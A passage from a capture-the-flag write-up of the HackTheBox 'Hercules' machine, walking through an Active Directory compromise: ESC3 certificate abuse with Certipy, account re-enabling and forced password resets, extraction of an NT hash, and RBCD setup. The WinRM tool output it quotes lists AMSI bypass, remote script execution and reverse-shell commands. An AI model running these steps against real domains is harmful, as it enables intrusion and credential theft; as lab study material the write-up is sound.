UserPrincipalName : fernando.r@hercules.htb
```

```powershell
└─$ bloodyAD -d hercules.htb -u auditor -k --host dc.hercules.htb --dc-ip 10.129.x.x remove uac fernando.r -f ACCOUNTDISABLE                                      
[-] ['ACCOUNTDISABLE'] property flags removed from fernando.r's userAccountControl
```

Check again `fernando.r`.

```powershell
PS C:\Users\auditor\Documents> Get-ADUser -Identity "fernando.r"


DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : True
GivenName         : Fernando
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb
```

It has been enable,  we can not reset `fernando.r` password.

```bash
└─$ bloodyAD -d hercules.htb -u auditor -k --host dc.hercules.htb --dc-ip 10.129.x.x set password fernando.r Ferrari@123    
[+] Password changed successfully!
```

### ESC3
![Hercules Website Bloodhound CE Fernando.r ESC3](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-ce-fernandor-esc3.png)

We gonna use [Certipy](https://github.com/ly4k/Certipy) to exploit follow step that Bloodhound CE showing us.

> *Here is the wiki from [ESC3: Enrollment Agent Certificate Template](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template) to understand more.*

![Hercules Website Bloodhound CE Fernando.r ESC3 Path](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-ce-fernandor-esc3-path.png)

Let's first request TGT for `fernando.r`.

```bash
└─$ getTGT.py -dc-ip 10.129.x.x -k hercules.htb/fernando.r:Ferrari@123      
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fernando.r.ccache
```

And if we want to ensure that the path Bloodhound CE show is not false-positive, we can verify by searching ADCS for vulnerable ceritificate templates.

```bash
└─$ export KRB5CCNAME=fernando.r.ccache
```

```bash
└─$ certipy-ad find -k -target dc.hercules.htb -dc-ip 10.129.x.x -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'CA-HERCULES' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'CA-HERCULES'
[*] Checking web enrollment for CA 'CA-HERCULES' @ 'dc.hercules.htb'
[!] Error checking web enrollment: The read operation timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : CA-HERCULES
    DNS Name                            : dc.hercules.htb
    Certificate Subject                 : CN=CA-HERCULES, DC=hercules, DC=htb
    Certificate Serial Number           : 1DD5F287C078F9924ED52E93ADFA1CCB
    Certificate Validity Start          : 2024-12-04 01:34:17+00:00
    Certificate Validity End            : 2034-12-04 01:44:17+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : HERCULES.HTB\Administrators
      Access Rights
        ManageCa                        : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        ManageCertificates              : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Enroll                          : HERCULES.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
  1
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
  2
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

Let's check more that if we got `fernando.r`, what user target is next?

![Hercules Website Bloodhound CE Fernando.r ESC3 Path Ashley.b](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-ce-fernandor-esc3-path-ashleyb.png)

As we can see, it gonna be `ashley.b` and not because it from this path, as we discover earlier, we got mail that related to `ashley.b` as well and this user got cleanup scripts so definitely need to take down this one. <br>
&rarr; Now following the step by step.

**Step 1: Use Certipy to request an enrollment agent certificate.**

```bash
└─$ certipy-ad req -k -dc-ip 10.129.x.x -target dc.hercules.htb -ca CA-HERCULES -template EnrollmentAgent
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'fernando.r@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1121'
[*] Saving certificate and private key to 'fernando.r.pfx'
[*] Wrote certificate and private key to 'fernando.r.pfx'
```

**Step 2: Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allow for authentication and permit enrollment agent enrollment.**

```bash
└─$ certipy-ad req -k -dc-ip 10.129.x.x -target dc.hercules.htb -ca CA-HERCULES -template 'User' -on-behalf-of 'hercules\ashley.b' -pfx fernando.r.pfx -dcom     
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via DCOM
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'ashley.b@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Saving certificate and private key to 'ashley.b.pfx'
[*] Wrote certificate and private key to 'ashley.b.pfx'
```

**Step 3: Request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate created in Step 2.**

```bash
└─$ certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.129.x.x  
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ashley.b@hercules.htb'
[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Using principal: 'ashley.b@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ashley.b.ccache'
[*] Wrote credential cache to 'ashley.b.ccache'
[*] Trying to retrieve NT hash for 'ashley.b'
[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
```

Now our next target is `iis_administrator`.

## Privilege Escalation
![Hercules Website Bloodhound CE IIS_Administrator](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-ce-iis-administrator.png)

We see that this account is not enable and also got `Admin Count` set to `TRUE` so that we can not re-enable this account straightforward. <br>
&rarr; That why `ashley.b` is the user we need to help us escalated this case.

Check the path from `iis_administrator` to `administrator` as our last boss.

![Hercules Website Bloodhound CE IIS_Administrator Path to Administrator](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-ce-iis-administrator-path-to-administrator.png)

Got `iis_administrator` is member of `SERVICE OPERATORS@HERCULES.HTB` group that can `ForceChangePassword` to `iis_webserver$` and this user can `AllowedToAct` over `DC.HERCULES.HTB`. <br>
&rarr; When we got to DC, we can simple dump all the hashes and access to `administrator` final boss :D.

### Lateral Movement
Request the TGT for `ashley.b`.

```bash
└─$ getTGT.py -dc-ip 10.129.x.x -hashes :1e719fbfddd226da74f644eac9df7fd2 -k hercules.htb/ashley.b
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ashley.b.ccache
```

```bash
└─$ export KRB5CCNAME=ashley.b.ccache
```

Access into `ashley.b` session as we know that this user also member of `REMOTE MANAGEMENT@HERCULES.HTB`.

```bash
└─$ python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb                                                          
[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\ashley.b
[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB
[*] '-dc-ip' not specified, using HERCULES.HTB
[*] requesting TGS for HTTP/dc.hercules.htb@HERCULES.HTB

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\ashley.b\Documents> dir
PS C:\Users\ashley.b\Documents> cd ..\Desktop
PS C:\Users\ashley.b\Desktop> dir


    Directory: C:\Users\ashley.b\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         12/4/2024  11:45 AM                Mail                                                                  
-a----         12/4/2024  11:45 AM            102 aCleanup.ps1
```

Let's check out the `\Mail` foler.

```powershell
PS C:\Users\ashley.b\Desktop\Mail> dir


    Directory: C:\Users\ashley.b\Desktop\Mail


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         12/4/2024  11:15 AM           1694 RE_ashley.eml                                                         


PS C:\Users\ashley.b\Desktop\Mail> type RE_ashley.eml
--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
Content-Type: multipart/alternative;
        boundary="_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_"

--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

Hello Ashley,

The issue you are facing is that some members in the Department were once p=
art of sensitive groups which are blocking your permissions.

I've discussed your issue at length with security and here is a solution th=
at we feel works for both us and your team. I've attached a copy of the scr=
ipt your team should run to your home folder. For convenience, We have prov=
ided a shortcut to the script in the IT share. You may also run the task ma=
nually from powershell.

If you have any other issues feel free to inform me.

Regards, Domain Admins.

________________________________
From: Ashley Browne
Sent: Monday 09:49:37 AM
To: Domain Admins <Administrator@HERCULES.HTB>
Subject: Unable to reset user's password.

Good Morning,

Today one of my staff received a password reset request from a user, but fo=
r some reason they were unable to perform the action due to invalid permiss=
ions. I have double checked against another user and confirmed our team has=
permission to handle password changes in the department the user belongs to=
. I was told to contact you for further assistance.

For reference the user is "will.s" from the "Engineering Department" Unit.

I look forward to your reply.

Regards, Ashley.

--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
```

From the content we can see that there is shortcut to script that we can run manually. <br>
&rarr; Let's check it out.

```powerhshell
PS C:\Users\ashley.b\Desktop> type aCleanup.ps1
Start-ScheduledTask -TaskName "Password Cleanup"
```

```powershell
PS C:\Users\ashley.b> dir


    Directory: C:\Users\ashley.b


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-r---         12/4/2024  11:45 AM                Desktop                                                               
d-r---         12/4/2024  11:44 AM                Documents                                                             
d-r---          5/8/2021   6:15 PM                Downloads                                                             
d-r---          5/8/2021   6:15 PM                Favorites                                                             
d-r---          5/8/2021   6:15 PM                Links                                                                 
d-r---          5/8/2021   6:15 PM                Music                                                                 
d-r---          5/8/2021   6:15 PM                Pictures                                                              
d-----          5/8/2021   6:15 PM                Saved Games                                                           
d-----         12/4/2024  11:45 AM                Scripts                                                               
d-r---          5/8/2021   6:15 PM                Videos                                                                


PS C:\Users\ashley.b> cd Scripts
PS C:\Users\ashley.b\Scripts> dir


    Directory: C:\Users\ashley.b\Scripts


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         12/4/2024  11:02 AM           1370 cleanup.ps1                                                           
```

```powershell
PS C:\Users\ashley.b\Scripts> type cleanup.ps1
function CanPasswordChangeIn {
    param ($ace)
    if($ace.ActiveDirectoryRights -match "ExtendedRight|GenericAll"){
        return $true
    }
    return $false
}

function CanChangePassword {
    param ($target, $object)

    $acls = (Get-Acl -Path "AD:$target").Access
    foreach($ace in $acls){
        if(($ace.IdentityReference -eq $object) -and (CanPasswordChangeIn $ace)){
            return $true
        }
    }
    return $false
}

function CleanArtifacts {
    param($Object)

    Set-ADObject -Identity $Object -Clear "adminCount"
    $acl = Get-Acl -Path "AD:$Object"
    $acl.SetAccessRuleProtection($False, $False)
    Set-Acl -Path "AD:$Object" -AclObject $acl
}

$group = "HERCULES\IT Support"
$objects = (Get-ADObject -Filter * -SearchBase "OU=DCHERCULES,DC=HERCULES,DC=HTB").DistinguishedName
$Path = "C:\Users\ashley.b\Scripts\log.txt"
Set-Content -Path $Path -Value ""

foreach($object in $objects){
    if(CanChangePassword $object $group){
        $Members = (Get-ADObject -Filter * -SearchBase $object | Where-Object { $_.DistinguishedName -ne $object }).DistinguishedName

        foreach($DN in $Members){
            try {
                CleanArtifacts $DN
            } 
            catch {
                $_.Exception.Message | Out-File $Path -Append
            }
            "Cleanup : $DN" | Out-File $Path -Append
        }
    }
}
```

This script automatically cleans up artifacts in AD when the `IT Support` group has permission to change the password of objects. <br>
&rarr; Let's run it out and check the `log.txt` file.

```powershell
PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
```

```powershell
PS C:\Users\ashley.b\Scripts> dir


    Directory: C:\Users\ashley.b\Scripts


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         12/4/2024  11:02 AM           1370 cleanup.ps1                                                           
-a----        10/24/2025   1:30 AM           1388 log.txt                                                               


PS C:\Users\ashley.b\Scripts> type log.txt

Cleanup : CN=Will Smith,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Zeke Solomon,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Adriana Italia,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Tish Ckenvkitch,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Jennifer Ankton,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Shae Jones,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
```

We can see that there is no `iis_administrator` but we can still not yet enable and reset password as well.

![Hercules Website Bloodhound CE Ashley.b IT Support](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-ce-ashleyb-it-support.png)

From bloodhound, `ashley.b` is member of `IT SUPPORT@HERCULES.HTB` that got permission to change password of objects. <br>
&rarr; So we gonna use this point to grant `GenericAll` on `Forest Migration` to `IT Support` so that we can able to reset `iis_administrator` password and then `GenericAll` on `Auditor` again to re-enable `iis_administrator`.

```bash
└─$ export KRB5CCNAME=Auditor.ccache
```

```bash
└─$ bloodyAD -d hercules.htb -u Auditor -k --host dc.hercules.htb --dc-ip 10.129.x.x add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' 'IT SUPPORT'
[+] IT SUPPORT has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
```

```bash
└─$ bloodyAD -d hercules.htb -u Auditor -k --host dc.hercules.htb --dc-ip 10.129.x.x add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor     
[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
```

Now run the script again.

```powershell
PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
```

```powershell
PS C:\Users\ashley.b\Scripts> type log.txt

Cleanup : CN=James Silver,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Anthony Rudd,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=WINSRV01-2016,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=WINSRV02-2016,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=WINSRV03-2016,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=ENTERPRISE01-8.1,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=ENTERPRISE02-8.1,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Windows Computer Administrators,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Taylor Maxwell,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Will Smith,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Zeke Solomon,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Adriana Italia,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Tish Ckenvkitch,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Jennifer Ankton,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Shae Jones,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
```

Now we can see it got cleanup for `IIS_Administrator`. <br>
&rarr; Up next we need to re-enable it up.

```powershell
PS C:\Users\auditor\Documents> Get-ADUser -Identity "IIS_Administrator"


DistinguishedName : CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : IIS_Administrator
Name              : IIS_Administrator
ObjectClass       : user
ObjectGUID        : 0ed3b2f9-aefa-41e7-9dcb-c7116ca37a1d
SamAccountName    : iis_administrator
SID               : S-1-5-21-1889966460-2597381952-958560702-1119
Surname           : 
UserPrincipalName : iis_administrator@hercules.htb
```

```bash
└─$ bloodyAD -d hercules.htb -u auditor -k --host dc.hercules.htb --dc-ip 10.129.x.x remove uac iis_administrator -f ACCOUNTDISABLE                                    
[-] ['ACCOUNTDISABLE'] property flags removed from iis_administrator's userAccountControl
```

After re-enable and cleanup, let's check it out again.

```powershell
PS C:\Users\auditor\Documents> Get-ADUser -Identity "IIS_Administrator"


DistinguishedName : CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : True
GivenName         : IIS_Administrator
Name              : IIS_Administrator
ObjectClass       : user
ObjectGUID        : 0ed3b2f9-aefa-41e7-9dcb-c7116ca37a1d
SamAccountName    : iis_administrator
SID               : S-1-5-21-1889966460-2597381952-958560702-1119
Surname           : 
UserPrincipalName : iis_administrator@hercules.htb
```

```powershell
PS C:\Users\auditor\Documents> Get-ADUser -Identity "IIS_Administrator" -Properties adminCount | Select-Object Name, adminCount

Name              adminCount
----              ----------
IIS_Administrator
```

Now let's reset it password.

```bash
└─$ bloodyAD -d hercules.htb -u auditor -k --host dc.hercules.htb --dc-ip 10.129.x.x set password iis_administrator 'Password123@' 
[+] Password changed successfully!
```

Request for TGT.

```bash
└─$ getTGT.py -dc-ip 10.129.x.x -k hercules.htb/iis_administrator:'Password123@'                  
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in iis_administrator.ccache
```

Now then our next target is `iis_webserver$`.

![Hercules Website Bloodhound CE IIS_Administrator Path to Administrator 1](/assets/img/hercules-htb-season9/hercules-htb-season9_website-bloodhound-ce-iis-administrator-path-to-administrator-1.png)

Let's [forcechangepassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) to `iis_webserver$`.

```bash
└─$ export KRB5CCNAME=iis_administrator.ccache
```

```bash
└─$ bloodyAD -d hercules.htb -u iis_administrator -k --host dc.hercules.htb --dc-ip 10.129.x.x set password 'iis_webserver$' 'P4ssword@123'
[+] Password changed successfully!
```

Request it TGT.

```bash
└─$ getTGT.py -dc-ip 10.129.x.x -k hercules.htb/iis_webserver$:'P4ssword@123'   
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in iis_webserver$.ccache
```

Now `iis_webserver$` can `AllowedToAct` to `DC.HERCULES.HTB`. <br>
&rarr; We will use this concept [rbcd-on-spn-less-users](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users) to explore the [rbcd](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) attack.

### RBCD
Set the ticket environment.

```bash
└─$ export KRB5CCNAME=iis_webserver\$.ccache
```

First we will obtain a TGT through overpass-the-hash to use RC4.

```bash
└─$ getTGT.py -hashes :$(pypykatz crypto nt 'P4ssword@123') hercules.htb/iis_webserver$               
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in iis_webserver$.ccache
```

Then obtain the TGT session key.

```bash
└─$ describeTicket.py iis_webserver\$.ccache | grep 'Ticket Session Key'
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] Ticket Session Key            : ec0cbf08136a42fdd752743059ffee7a
```

After that change the `controlledaccountwithoutSPN`'s NT hash with the TGT session key.

```bash
└─$ changepasswd.py -newhashes :ec0cbf08136a42fdd752743059ffee7a hercules.htb/iis_webserver$:'P4ssword@123'@dc.hercules.htb -k
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of hercules.htb\iis_webserver$
